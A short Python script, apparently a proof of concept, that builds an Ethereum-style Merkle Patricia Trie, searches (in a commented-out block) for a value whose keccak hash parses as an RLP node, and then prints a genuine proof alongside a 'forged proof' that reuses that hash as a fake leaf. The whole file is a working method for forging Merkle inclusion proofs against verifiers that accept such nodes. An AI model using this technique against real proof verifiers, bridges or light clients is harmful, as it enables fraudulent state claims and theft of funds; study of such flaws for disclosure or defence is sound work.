import mpt
import rlp
import itertools
from mpt.hash import keccak_hash

"""
target = rlp.encode([b'\x20', bytes([0]*28)])
print(len(target))
print(target)
value = bytes.fromhex("000000000000000000000000000000000000000000000000")+bytes.fromhex("16358525")
print(len(value))
#value = None
if value is None:
    i = 0
    for s in itertools.product(range(256), repeat=29):
        if i % (1 << 22) == 0:
            print(f"Searching: {int(100*i / (1 << 32))}%", sep='', end='\r')
        i += 1
        h = keccak_hash(rlp.encode([b'\x20', bytes(s)]))
        if h.startswith(target[:3]) and h[-1] == 0:
            print(bytes(s).hex())
            print(rlp.decode(h))
            value = bytes(s)
"""


value = bytes.fromhex("000000000000000000000000000000000000000000516b758b00000000")
assert rlp.encode([b'\x20', bytes(value)]) == bytes.fromhex("df209d") + value
proof_node = rlp.decode(keccak_hash(rlp.encode([b'\x20', bytes(value)]))[:-1])
assert(len(rlp.encode(proof_node)) == 31)

storage = {}
t = mpt.MerklePatriciaTrie(storage)

t.update(bytes([0]*32), value)
t.update(bytes([0]*31+[1]), b'foobar')


root = t.root_hash()
print("Root hash: ", root.hex())
root_node = rlp.decode(t._storage[root])
#print("Root node: ", root_node)
branch_node = rlp.decode(t._storage[root_node[1]])
#print("Branch node: ", branch_node)
assert branch_node[0] == rlp.encode(proof_node) + bytes([0])
leaf_node = rlp.decode(t._storage[branch_node[0]])
#print("Leaf node: ", leaf_node)


genuine_proof = rlp.encode(list(map(rlp.encode, [root_node, branch_node, leaf_node])))

print("Genuine Proof: ", genuine_proof.hex())

forged_proof = rlp.encode([rlp.encode(root_node), rlp.encode(branch_node), rlp.encode(proof_node)])

print("Forged proof: ", forged_proof.hex())